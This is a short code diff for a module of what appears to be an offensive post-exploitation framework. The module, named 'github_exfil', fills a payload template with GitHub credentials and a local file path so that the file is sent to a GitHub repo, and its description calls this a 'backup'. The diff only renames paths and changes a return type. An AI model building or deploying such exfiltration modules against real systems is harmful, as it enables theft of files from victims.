@@ -1,6 +1,7 @@
 class STModule:
     def __init__(self):
-        self.name = 'github_exfill'
+        self.name = 'ipy/github_exfil'
+        self.language = 'ipy'
         self.description = 'Backs up files to a github repo'
         self.author = 'Tristan Messner'
         self.options = {
@@ -37,7 +38,7 @@ class STModule:
         }
 
     def payload(self):
-        with open('modules/src/github_exfill.py', 'r') as module_src:
+        with open('modules/ipy/src/github_exfil.py', 'r') as module_src:
             src = module_src.read()
             src = src.replace("GHUSER", self.options['Username']['Value'])
             src = src.replace("GH_PAT", self.options['PAT']['Value'])
@@ -45,4 +46,4 @@ class STModule:
             src = src.replace("GHPATH", self.options['Repo_path']['Value'])
             src = src.replace("GHFILE", self.options['Repo_file']['Value'])
             src = src.replace("LOCALFILE", self.options['Local_file']['Value'])
-            return src.encode()
+            return src
